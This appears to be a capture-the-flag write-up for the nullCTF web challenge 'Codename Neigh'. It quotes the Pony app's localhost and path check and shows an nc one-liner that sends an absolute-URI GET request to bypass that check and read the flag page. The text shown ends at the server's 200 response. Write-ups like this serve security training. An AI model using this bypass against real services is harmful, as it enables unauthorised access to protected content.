...
author: robo.uzi
tags: [CTF]
permalink: /nullCTF-codename-neigh/
---
* TOC
{:toc}
...
**Description**: Beyond the known chronometers lies the Temporal Nexus. Within its databanks, a desperate message echoes: a time traveler's plea for his lost companion, Neigh, vanished into the mists of history. Explore restricted archives, consult paradox guides, and perhaps, lend your eyes to a search that spans epochs. [http://public.ctf.r0devnull.team:3002/](http://public.ctf.r0devnull.team:3002/)

I download the challenge files. This is source code for the site written in [pony](https://www.ponylang.io/):
```shell
use "net"  
use "files"  
use "jennet"  
...
![Alt text](/images/Temporal-Nexus-Central-Hub.png)

You can "report a sighting" on `/pony` but this page wont actually help to get the flag:

![Alt text](/images/MISSING-UNIT-REPORT-NEIGH.png)

They try to protect the flag like this:
```shell
if (conn == "127.0.0.1") and (path != "/flag") and (path != "flag") then  
     let fpath = FilePath(_fileauth, "public/flag.html")  
```

I know `http://127.0.0.1/flag` will bypass these checks:
```shell
printf 'GET http://127.0.0.1/flag HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n' | nc public.ctf.r0devnull.team 3002  
HTTP/1.1 200 OK  
Connection: close  
Content-Length: 173  
